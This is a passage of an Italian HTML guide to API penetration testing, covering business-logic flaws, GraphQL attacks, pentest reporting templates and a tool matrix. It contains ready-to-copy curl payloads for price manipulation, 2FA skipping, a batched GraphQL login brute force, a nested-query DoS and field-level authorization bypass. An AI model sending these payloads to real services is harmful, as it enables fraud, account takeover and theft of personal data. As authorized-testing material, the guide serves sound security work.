        <div class="test-desc">I logic flaw non possono essere trovati con scanner automatici. Richiedono comprensione del business flow. Testare: valori negativi/zero, boundary values, workflow skip, manipolazione prezzi, abuso promozioni, e ordini con stock 0.</div>
        <div class="tools-row">
          <span class="tool-badge">curl</span>
          <span class="tool-badge">Burp Suite</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>LOGIC FLAW — TEST CASES</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># 1. Quantità negative (credito negativo = debito dell'app)</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/cart/add</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"product_id":42,"quantity":-5,"price":9.99}'</span>

<span class="c-comment"># 2. Price manipulation</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/order</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"items":[{"id":1,"price":0.001,"qty":1}]}'</span>

<span class="c-comment"># 3. Skip step workflow (2FA bypass)</span>
<span class="c-comment"># Login → skip /api/2fa/verify → chiama direttamente</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> GET <span class="c-url">https://target.com/api/v1/dashboard</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer PARTIAL_SESSION_TOKEN"</span>

<span class="c-comment"># 4. Integer overflow</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/transfer</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"amount":9999999999999999,"to_account":"attacker"}'</span>

<span class="c-comment"># 5. Object type confusion (string → number)</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/discount</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"code":"SAVE10","amount":"100%"}'</span></pre>
        </div>
      </div>
    </div>

  </div>
</section>

<!-- ════════════════════════════════ PHASE 7 ════════════════════════════════ -->
<section class="phase" id="phase7">
  <div class="phase-header">
    <div class="phase-number teal">07</div>
    <div>
      <div class="phase-title">GraphQL Security Testing</div>
      <div class="phase-subtitle">introspection · batching · dos · injection · auth bypass</div>
    </div>
  </div>

  <div class="description teal">
    <p>GraphQL ha un modello di sicurezza profondamente diverso da REST. Un singolo endpoint gestisce tutte le operazioni, e il linguaggio di query è estremamente flessibile. Questo introduce vulnerabilità uniche: <strong>introspection abuse</strong> per mappare l'intero schema, <strong>query batching</strong> per aggirare il rate limiting, <strong>nested queries</strong> per denial-of-service, e <strong>field suggestion</strong> per scoprire campi nascosti.</p>
    <p>Se l'introspection è disabilitata, tool come <strong>Clairvoyance</strong> permettono di dedurre lo schema tramite il meccanismo di field suggestion che GraphQL usa per aiutare gli sviluppatori (e anche gli attaccanti). Una volta ottenuto lo schema completo, si hanno tutti gli endpoint, tipi e parametri dell'API.</p>
  </div>

  <div class="test-grid">

    <!-- TEST 7.1 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">7.1 — GraphQL Schema Extraction</span>
        <span class="test-severity sev-high">HIGH VALUE</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">L'introspection in produzione espone l'intera struttura dell'API. Se disabilitata, Clairvoyance la ricostruisce ugualmente sfruttando i messaggi di errore suggestivi di GraphQL. Lo schema completo è necessario per testare ogni query e mutation disponibile.</div>
        <div class="tools-row">
          <span class="tool-badge">clairvoyance</span>
          <span class="tool-badge">Altair GraphQL</span>
          <span class="tool-badge">curl</span>
          <span class="tool-badge">graphql-cop</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>INTROSPECTION QUERY + CLAIRVOYANCE</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># 1. Introspection diretta</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/graphql</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer TOKEN"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"query":"{ __schema { types { name fields { name type { name kind ofType { name kind } } args { name type { name } } } } } }"}'</span>

<span class="c-comment"># 2. Clairvoyance — schema anche con introspection off</span>
<span class="c-cmd">pip3</span> install clairvoyance
<span class="c-cmd">python3</span> <span class="c-flag">-m</span> clairvoyance \
  <span class="c-flag">-o</span> schema.json \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer TOKEN"</span> \
  <span class="c-url">https://target.com/graphql</span>

<span class="c-comment"># 3. graphql-cop — security audit automatico</span>
<span class="c-cmd">pip3</span> install graphql-cop
<span class="c-cmd">graphql-cop</span> <span class="c-flag">-t</span> <span class="c-url">https://target.com/graphql</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer TOKEN"</span>

<span class="c-comment"># 4. Cerca tipi sensibili nello schema</span>
<span class="c-cmd">cat</span> schema.json | <span class="c-cmd">python3</span> <span class="c-flag">-c</span> <span class="c-string">"
import json,sys
s=json.load(sys.stdin)
for t in s['data']['__schema']['types']:
  if t['name'] and not t['name'].startswith('__'):
    print(t['name'])
"</span></pre>
        </div>
      </div>
    </div>

    <!-- TEST 7.2 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">7.2 — GraphQL Attack Techniques</span>
        <span class="test-severity sev-high">HIGH</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Query batching per bypassare il rate limiting su mutation di login. Deeply nested queries per DoS (query amplification). Field duplication per alias. Mutation injection. Testing di authorization su singoli field (field-level authorization bypass).</div>
        <div class="tools-row">
          <span class="tool-badge">curl</span>
          <span class="tool-badge">Burp Suite</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>BATCHING ATTACK + NESTED DoS</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># 1. Query batching — brute force login (bypass rate limit)</span>
<span class="c-cmd">python3</span> <span class="c-flag">-c</span> <span class="c-string">"
import json
passwords = ['admin','password','123456','secret','letmein']
batch = [
  {'query': f'mutation {{ login(user: \"admin\", pass: \"{p}\") {{ token }} }}'}
  for p in passwords
]
print(json.dumps(batch))
"</span> | <span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/graphql</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> @-

<span class="c-comment"># 2. Deeply nested query — DoS (query amplification)</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/graphql</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"query":"{ users { friends { friends { friends { friends { friends { name } } } } } } }"}'</span>

<span class="c-comment"># 3. Field suggestion — scopri campi nascosti</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/graphql</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"query":"{ user { passwor } }"}'</span>
<span class="c-comment"># → Errore: 'Did you mean password, passwordHash?'</span>

<span class="c-comment"># 4. Auth bypass su field-level</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/graphql</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer USER_TOKEN"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"query":"{ user(id:\"other-user-id\") { email phone ssn creditCard } }"}'</span></pre>
        </div>
      </div>
    </div>

  </div>
</section>

<!-- ════════════════════════════════ PHASE 8 ════════════════════════════════ -->
<section class="phase" id="phase8">
  <div class="phase-header">
    <div class="phase-number">08</div>
    <div>
      <div class="phase-title">Reporting &amp; Documentation</div>
      <div class="phase-subtitle">cvss scoring · poc · executive summary · remediation</div>
    </div>
  </div>

  <div class="description">
    <p>Un pentest è efficace solo se il report che produce è comprensibile, azionabile e convincente. Il report deve parlare sia al tecnico che al management. Ogni finding deve avere: una descrizione tecnica precisa, un proof-of-concept riproducibile passo-per-passo, l'impatto sul business espresso in linguaggio non tecnico, e una remediation specifica con riferimenti (CWE, OWASP).</p>
    <p>Il CVSS score dà oggettività alla severità, ma in un API pentest è importante considerare anche il <strong>business context</strong>: una BOLA su endpoint che espone PII bancaria è Critical anche se il CVSS base è 7.5. Documenta tutto con screenshot, request/response complete e curl command riproducibili.</p>
  </div>

  <div class="test-grid">

    <!-- FINDING TEMPLATE -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">Finding Template — Struttura Standard</span>
        <span class="test-severity sev-info">TEMPLATE</span>
      </div>
      <div class="test-card-body">
        <div class="code-wrap">
          <div class="code-label">
            <span>FINDING MARKDOWN TEMPLATE</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment">## [VULN-001] BOLA — Accesso non autorizzato a risorse utente</span>

<span class="c-kw">### Severity:</span> <span class="c-var">CRITICAL</span>
<span class="c-kw">### CVSS v3.1:</span> <span class="c-num">9.1</span> (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
<span class="c-kw">### CWE:</span> CWE-<span class="c-num">639</span> - Authorization Bypass Through User-Controlled Key
<span class="c-kw">### OWASP:</span> API1:2023

<span class="c-kw">### Descrizione</span>
L'endpoint GET /api/v1/users/{id}/documents non verifica che
l'ID utente nella path corrisponda all'utente autenticato.
Un attaccante può enumerare tutti gli ID e accedere ai
documenti di qualsiasi utente.

<span class="c-kw">### Impatto Business</span>
Esposizione completa dei dati di tutti gli utenti registrati
(~50.000 record). Include PII, documenti contrattuali e dati
finanziari. Violazione GDPR con sanzioni fino al 4% del
fatturato annuo globale.

<span class="c-kw">### Proof of Concept</span>
<span class="c-comment"># 1. Autentica come utente1 (ID: 1234)</span>
<span class="c-comment"># 2. Recupera documenti di utente2 (ID: 1235)</span>
curl -X GET https://target.com/api/v1/users/<span class="c-num">1235</span>/documents \
  -H <span class="c-string">"Authorization: Bearer UTENTE1_TOKEN"</span>
<span class="c-comment"># Response: 200 OK con documenti di utente2</span>

<span class="c-kw">### Remediation</span>
Implementare controllo authorization lato server:
- Verificare che user.id == requested_id prima di ogni query
- Non affidarsi solo all'autenticazione, ma enforce authorization
- Usare oggetti indiretti non enumerabili (UUID v4)
- Implementare test automatici per BOLA nel CI/CD pipeline</pre>
        </div>
      </div>
    </div>

    <!-- TOOLS REPORT -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">Tool di Reportistica Open Source</span>
        <span class="test-severity sev-info">TOOLS</span>
      </div>
      <div class="test-card-body">
        <table class="tool-table">
          <tr>
            <th>Tool</th>
            <th>Tipo</th>
            <th>Note</th>
          </tr>
          <tr>
            <td>Ghostwriter</td>
            <td>Piattaforma full pentest</td>
            <td>Project management, finding DB, report generation, client portal</td>
          </tr>
          <tr>
            <td>Pwndoc</td>
            <td>Report generator</td>
            <td>Template Word/PDF, finding library, multi-user, self-hosted</td>
          </tr>
          <tr>
            <td>PlexTrac</td>
            <td>Collaborative platform</td>
            <td>Free tier disponibile, ottimo per team</td>
          </tr>
          <tr>
            <td>CVSS Calculator</td>
            <td>Score tool</td>
            <td>NIST NVD CVSS v3.1 online calculator</td>
          </tr>
          <tr>
            <td>Obsidian</td>
            <td>Note taking</td>
            <td>Markdown, graph view, ottimo per prendere note durante il test</td>
          </tr>
        </table>
        <div class="code-wrap" style="margin-top:16px;">
          <div class="code-label">
            <span>SETUP GHOSTWRITER (DOCKER)</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Ghostwriter — piattaforma di reportistica enterprise</span>
<span class="c-cmd">git</span> clone <span class="c-url">https://github.com/GhostManager/Ghostwriter</span>
<span class="c-cmd">cd</span> Ghostwriter
<span class="c-cmd">cp</span> config/.env.example config/.env
<span class="c-comment"># Edita config/.env con le tue impostazioni</span>
<span class="c-cmd">docker-compose</span> <span class="c-flag">-f</span> docker-compose.yml up <span class="c-flag">-d</span>

<span class="c-comment"># Pwndoc — più leggero</span>
<span class="c-cmd">git</span> clone <span class="c-url">https://github.com/pwndoc/pwndoc</span>
<span class="c-cmd">cd</span> pwndoc
<span class="c-cmd">docker-compose</span> up <span class="c-flag">-d</span></pre>
        </div>
      </div>
    </div>

  </div>

  <!-- CHECKLIST FINALE -->
  <div style="margin-top:28px;">
    <div style="font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text3); letter-spacing:2px; text-transform:uppercase; margin-bottom:12px;">CHECKLIST FINALE PRE-CONSEGNA</div>
    <ul class="checklist">
      <li>Ogni finding ha CVSS score, CWE e riferimento OWASP API Top 10</li>
      <li>Ogni finding ha un PoC riproducibile con curl command o screenshot</li>
      <li>L'impatto business è descritto in linguaggio non tecnico per il management</li>
      <li>La remediation è specifica (non generica), con esempi di codice se possibile</li>
      <li>Le severity sono calibrate al contesto business, non solo al CVSS base</li>
      <li>L'executive summary copre: scope, metodologia, finding critici, risk level</li>
      <li>Tutti i dati sensibili raccolti durante il test sono stati cancellati/restituiti</li>
      <li>Il report è stato revisionato da un secondo analista (peer review)</li>
    </ul>
  </div>
</section>

<!-- TOOL MATRIX -->
<section style="padding: 48px 0; border-top: 1px solid var(--border);">
  <div style="font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text3); letter-spacing:3px; text-transform:uppercase; margin-bottom:20px;">TOOL MATRIX COMPLETA</div>
  <table class="tool-table">
    <tr>
      <th>Fase</th>
      <th>Tool Principale</th>
      <th>Tool Secondari</th>
      <th>Install</th>
    </tr>
    <tr>
      <td>01 · Recon</td>
      <td>Amass · Subfinder</td>
      <td>Gau, TruffleHog, Gitleaks, Shodan CLI</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">go install / pip3</td>
    </tr>
    <tr>
      <td>02 · Enumeration</td>
      <td>Kiterunner</td>
      <td>ffuf, feroxbuster, httpx, dnsx</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">go install / binary</td>
    </tr>
    <tr>
      <td>03 · Auth</td>
      <td>jwt_tool</td>
      <td>hashcat, Burp JWT Editor plugin</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">pip3 install</td>
    </tr>
    <tr>
      <td>04 · AuthZ</td>
      <td>Burp + Autorize</td>
      <td>ffuf, curl, custom Python</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">BApp Store</td>
    </tr>
    <tr>
      <td>05 · Injection</td>
      <td>sqlmap</td>
      <td>interactsh, Burp Suite, curl</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">pip3 / binary</td>
    </tr>
    <tr>
      <td>06 · Logic</td>
      <td>Turbo Intruder</td>
      <td>ffuf, aiohttp Python, Burp</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">BApp Store</td>
    </tr>
    <tr>
      <td>07 · GraphQL</td>
      <td>clairvoyance</td>
      <td>graphql-cop, Altair, Burp</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">pip3 install</td>
    </tr>
    <tr>
      <td>08 · Reporting</td>
      <td>Ghostwriter</td>
      <td>Pwndoc, Obsidian, NIST CVSS Calc</td>
      <td style="color:var(--accent3);font-family:'JetBrains Mono',monospace;font-size:11px;">Docker compose</td>
    </tr>
  </table>
</section>

</div><!-- end container -->

<footer>
  <div class="container">
    <div style="color:var(--text3);">USO ESCLUSIVO PER <span>PENETRATION TEST AUTORIZZATI</span> — SEMPRE OTTENERE PERMESSO SCRITTO PRIMA DI PROCEDERE</div>
    <div style="margin-top:8px;">OWASP API Security Project 2023 · CVSS v3.1 · Generato per Security Engineer</div>
  </div>
</footer>

<script>
  // ── Navigate to section ──────────────────────────────────────────
  function gotoPhase(id) {
    const el = document.getElementById(id);
    if (!el) return;
    const navH = document.querySelector('.nav-sticky').offsetHeight;
    const top = el.getBoundingClientRect().top + window.pageYOffset - navH - 16;
    window.scrollTo({ top: top, behavior: 'smooth' });
  }

  // ── Reveal phases on scroll ──────────────────────────────────────
  const revealObs = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) entry.target.classList.add('visible');
    });
  }, { threshold: 0.06, rootMargin: '0px 0px -40px 0px' });

  document.querySelectorAll('.phase').forEach(p => revealObs.observe(p));

  // Show all phases immediately if IntersectionObserver never fires (fallback)
  setTimeout(() => {
    document.querySelectorAll('.phase').forEach(p => p.classList.add('visible'));
  }, 800);

  // ── Active nav highlight ─────────────────────────────────────────
  const navBtns = document.querySelectorAll('.nav-btn');
  const phases  = document.querySelectorAll('.phase');

  const navObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const id = entry.target.id;
        const ids = ['phase1','phase2','phase3','phase4','phase5','phase6','phase7','phase8'];
        const idx = ids.indexOf(id);
        if (idx !== -1) {
          navBtns.forEach(b => b.classList.remove('active'));
          navBtns[idx].classList.add('active');
        }
      }
    });
  }, { threshold: 0.35 });

  phases.forEach(p => navObserver.observe(p));

  // ── Copy button ──────────────────────────────────────────────────
  function copyCode(btn) {
    const pre = btn.closest('.code-wrap').querySelector('pre');
    const text = pre.innerText || pre.textContent;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => {
        btn.textContent = 'COPIED ✓';
        btn.classList.add('copied');
        setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 2000);
      }).catch(() => fallbackCopy(text, btn));
    } else {
      fallbackCopy(text, btn);
    }
  }

  function fallbackCopy(text, btn) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try {
      document.execCommand('copy');
      btn.textContent = 'COPIED ✓';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 2000);
    } catch(e) {
      btn.textContent = 'FAILED';
      setTimeout(() => { btn.textContent = 'COPY'; }, 2000);
    }
    document.body.removeChild(ta);
  }
</script>
</body>
</html>